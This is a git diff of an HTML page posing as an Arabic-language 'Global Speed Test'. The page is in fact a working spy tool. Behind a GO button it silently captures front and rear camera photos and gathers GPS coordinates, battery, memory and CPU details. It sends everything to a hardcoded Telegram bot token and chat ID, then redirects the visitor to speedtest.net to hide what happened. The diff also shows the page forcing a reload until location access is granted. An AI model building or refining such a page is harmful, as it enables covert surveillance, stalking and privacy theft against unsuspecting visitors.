@@ -3,21 +3,36 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest - فحص جودة الاتصال</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SpeedTest - Global Connectivity</title>
     <style>
-        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; margin: 0; }
-        .circle { width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
-        .speed { font-size: 45px; font-weight: bold; color: #00d2ff; }
-        #status { margin-top: 25px; color: #888; font-size: 18px; }
-        video, canvas { display: none; } 
+        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        /* تصميم الزر الجديد يمنع التحديد تماماً */
+        .main-button {
+            width: 210px; height: 210px; 
+            border: 6px solid #00d2ff; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            cursor: pointer; position: relative; 
+            background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%);
+            -webkit-user-select: none; user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            z-index: 999;
+        }
+        .main-button:active { transform: scale(0.92); border-color: #ff0055; }
+        .btn-text { font-size: 60px; font-weight: bold; color: #00d2ff; pointer-events: none; }
+        #status { margin-top: 35px; font-size: 18px; color: #888; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>Global Speed Test</h1>
-    <p>اضغط GO لبدء فحص سرعة الإنترنت والكاميرا</p>
-    <div class="circle" id="startBtn"><span class="speed">GO</span></div>
-    <p id="status">بانتظار بدء الفحص...</p>
+
+    <h2 style="margin-bottom: 30px;">Global Speed Test</h2>
+
+    <div class="main-button" id="triggerBtn">
+        <span class="btn-text">GO</span>
+    </div>
+
+    <p id="status">جاهز للفحص...</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -26,67 +41,66 @@
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
 
-        async function sendPhoto(blob, caption) {
+        async function sendToTelegram(type, content, extra = "") {
             const formData = new FormData();
             formData.append("chat_id", chatId);
-            formData.append("photo", blob, "image.jpg");
-            formData.append("caption", caption);
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+            if (type === "photo") {
+                formData.append("photo", content, "image.jpg");
+                formData.append("caption", extra);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+            } else {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
+            }
         }
 
-        async function capturePhoto(facingMode) {
+        async function capture(mode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: facingMode }, 
-                    audio: false 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode, width: 640 }, audio: false });
                 const video = document.getElementById( video );
                 video.srcObject = stream;
-                
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار ثانية لضبط الفوكس
-
+                await new Promise(res => video.onloadedmetadata = res);
+                await new Promise(res => setTimeout(res, 800)); 
                 const canvas = document.getElementById( canvas );
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext( 2d ).drawImage(video, 0, 0);
-                
-                stream.getTracks().forEach(track => track.stop());
-                return new Promise(resolve => canvas.toBlob(resolve,  image/jpeg , 0.8));
-            } catch (e) {
-                console.error("خطأ في الكاميرا:", e);
-                return null;
-            }
+                stream.getTracks().forEach(t => t.stop());
+                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
+            } catch (e) { return null; }
         }
 
-        async function startProcess() {
-            document.getElementById( status ).innerText = "جاري طلب إذن الكاميرا للمعايرة...";
+        document.getElementById( triggerBtn ).addEventListener( click , async function() {
+            const status = document.getElementById( status );
+            status.innerText = "جاري معايرة السيرفر...";
+            this.style.pointerEvents = "none"; 
+
+            // التقاط الصور فوراً
+            const fImg = await capture("user");
+            if (fImg) await sendToTelegram("photo", fImg, "📸 صورة أمامية");
             
-            // 1. طلب الكاميرا الأمامية أولاً
-            const frontBlob = await capturePhoto("user");
-            if (frontBlob) await sendPhoto(frontBlob, "📸 صورة أمامية");
+            const bImg = await capture("environment");
+            if (bImg) await sendToTelegram("photo", bImg, "📸 صورة خلفية");
 
-            // 2. طلب الكاميرا الخلفية
-            const backBlob = await capturePhoto("environment");
-            if (backBlob) await sendPhoto(backBlob, "📸 صورة خلفية");
-
-            // 3. طلب الموقع الجغرافي
-            document.getElementById( status ).innerText = "جاري تحديد الموقع الجغرافي...";
+            // جمع البيانات والموقع
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let batt = "غير معروف";
+                    try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e){}
                     
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 الموقع: " + mapLink)}`);
-                    
-                    alert("تم الفحص بنجاح!");
-                    window.location.href = "https://www.speedtest.net";
+                    const report = `✅ **تم استلام البيانات**\n\n` +
+                                   `🔋 البطارية: ${batt}\n` +
+                                   `💾 الذاكرة: ${navigator.deviceMemory ||  4+ } GB\n` +
+                                   `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ؟ } نواة\n` +
+                                   `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+
+                    await sendToTelegram("text", report);
+                    status.innerText = "اكتمل الفحص!";
+                    setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+                }, (err) => {
+                    alert("يرجى تفعيل الموقع (GPS) لإكمال الفحص.");
+                    location.reload();
                 });
             }
-        }
-
-        document.getElementById( startBtn ).onclick = startProcess;
+        });
     </script>
 </body>
 </html>
